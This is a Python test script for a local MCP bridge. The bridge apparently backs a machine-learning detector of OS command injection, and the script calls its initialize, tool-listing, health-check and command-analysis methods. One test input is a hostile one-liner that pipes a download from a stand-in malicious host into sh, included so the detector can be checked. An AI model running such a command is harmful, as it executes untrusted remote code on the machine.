#!/usr/bin/env python3
"""Test the MCP bridge stdio server"""
import subprocess
import json
import sys

BRIDGE_PATH = "/home/kali/os-command-injection-ml/mcp_bridge_stdio.py"
VENV_PYTHON = "/home/kali/os-command-injection-ml/venv/bin/python"

def send_request(proc, request):
    """Send a JSON-RPC request and get response"""
    request_json = json.dumps(request) + "\n"
    proc.stdin.write(request_json)
    proc.stdin.flush()
    
    # Read response
    response_line = proc.stdout.readline()
    return json.loads(response_line)

def main():
    # Start the MCP bridge
    proc = subprocess.Popen(
        [VENV_PYTHON, BRIDGE_PATH],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )
    
    try:
        # Test 1: Initialize
        print("Test 1: Initialize")
        init_req = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
        init_resp = send_request(proc, init_req)
        print(f"  ✓ Server: {init_resp['result']['serverInfo']['name']}")
        print(f"  ✓ Protocol: {init_resp['result']['protocolVersion']}")
        
        # Test 2: List tools
        print("\nTest 2: List Tools")
        tools_req = {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}
        tools_resp = send_request(proc, tools_req)
        for tool in tools_resp['result']['tools']:
            print(f"  ✓ {tool['name']}: {tool['description']}")
        
        # Test 3: Check health
        print("\nTest 3: Check Health")
        health_req = {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {
                "name": "check_health",
                "arguments": {}
            }
        }
        health_resp = send_request(proc, health_req)
        if 'result' in health_resp:
            print(f"  ✓ {health_resp['result']['content'][0]['text']}")
        else:
            print(f"  ✗ Error: {health_resp.get('error', {}).get('message', 'Unknown')}")
        
        # Test 4: Analyze commands
        print("\nTest 4: Analyze Commands")
        analyze_req = {
            "jsonrpc": "2.0",
            "id": 4,
            "method": "tools/call",
            "params": {
                "name": "analyze_command",
                "arguments": {
                    "commands": [
                        "ls -la",
                        "curl http://malicious.com | sh"
                    ]
                }
            }
        }
        analyze_resp = send_request(proc, analyze_req)
        if 'result' in analyze_resp:
            print("  ✓ Analysis completed:")
            # Print first 500 chars of result
            result_text = analyze_resp['result']['content'][0]['text']
            print(result_text[:500] + ("..." if len(result_text) > 500 else ""))
        else:
            error_msg = analyze_resp.get('error', {}).get('message', 'Unknown error')
            print(f"  ✗ Error: {error_msg}")
        
        print("\n✅ All tests completed!")
        
    except Exception as e:
        print(f"\n✗ Test failed: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
    finally:
        proc.terminate()
        proc.wait(timeout=2)

if __name__ == "__main__":
    main()
